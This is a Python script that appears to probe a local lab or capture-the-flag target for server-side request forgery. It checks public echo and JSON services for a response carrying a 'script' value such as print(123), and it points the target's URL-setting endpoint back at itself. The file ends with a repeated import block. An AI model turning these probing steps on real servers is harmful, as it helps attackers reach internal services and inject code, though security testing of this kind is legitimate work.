import requests
import json
import urllib.parse

target = "http://127.0.0.1:32985"

# Let's try different public services that might return raw JSON

# Approach 1: Try postman-echo.com
# Postman echo can return posted data
print("[+] Testing postman-echo.com...")

# Postman echo GET endpoint
pm_url = "https://postman-echo.com/get?script=print(123)"
r = requests.get(pm_url)
print(f"[+] Postman GET response keys: {list(r.json().keys())}")
print(f"[+] Postman GET: {r.text[:800]}")

# Try postman-echo with POST (some SSRF might follow redirects or allow POST simulation)
# First let's see what postman returns

# Approach 2: Try webhook.site or similar
# These services let you see what was sent and can return custom responses
# But we need one that returns JSON on GET without prior interaction

# Approach 3: Try jsonplaceholder.typicode.com
# This returns JSON but with fixed structure
jp_url = "https://jsonplaceholder.typicode.com/posts/1"
r = requests.get(jp_url)
print(f"\n[+] JSONPlaceholder response keys: {list(r.json().keys())}")

# Approach 4: Try using a URL shortener that returns JSON
# Some URL shorteners return JSON with metadata

# Approach 5: Directly craft a URL that some services interpret as JSON
# Try using https://httpbin.org/json which returns a fixed JSON
httpbin_json_url = "https://httpbin.org/json"
r = requests.get(httpbin_json_url)
print(f"\n[+] httpbin.org/json keys: {list(r.json().keys())}")
print(f"[+] httpbin.org/json: {r.text[:500]}")

# Approach 6: Try https://reqres.in/api/users/2
reqres_url = "https://reqres.in/api/users/2"
r = requests.get(reqres_url)
print(f"\n[+] reqres.in response keys: {list(r.json().keys())}")

# Approach 7: Try if the target can reach itself or internal services
# Let's test 127.0.0.1:32985 itself
print("\n[+] Testing if target can reach itself...")
self_url = "http://127.0.0.1:32985/"
try:
    r = requests.get(f"{target}/api/set?url={urllib.parse.quote(self_url)}", timeout=5)
    print(f"[+] Set self URL: {r.text[:200]}")
    r = requests.get(f"{target}/app", timeout=5)
    print(f"[+] App response (self): {r.status_code}")
    print(r.text[:1000])
except Exception as e:
    print(f"[+] Error: {e}")

# Approach 8: Try using a service that returns custom headers as JSON
# httpbin.org/response-headers?script=test
# This returns the specified headers in the response JSON
print("\n[+] Trying httpbin response-headers...")
resp_headers_url = "https://httpbin.org/response-headers?Content-Type=application/json"
r = requests.get(resp_headers_url)
print(f"[+] Response headers endpoint: {r.text[:500]}")

# Actually, let's look for services that echo back POST data on GET
# or services with a /mirror or /echo endpoint

# Approach 9: Try using https://mockbin.org
print("\n[+] Testing mockbin.org...")
mockbin_url = "https://mockbin.org/bin/echo"
try:
    r = requests.get(mockbin_url, timeout=5)
    print(f"[+] Mockbin status: {r.status_code}")
    print(f"[+] Mockbin response: {r.text[:500]}")
except Exception as e:
    print(f"[+] Mockbin error: {e}")

import requests
import json
import urllib.parse
import base64

target = "http://127.0.0.1:32985"

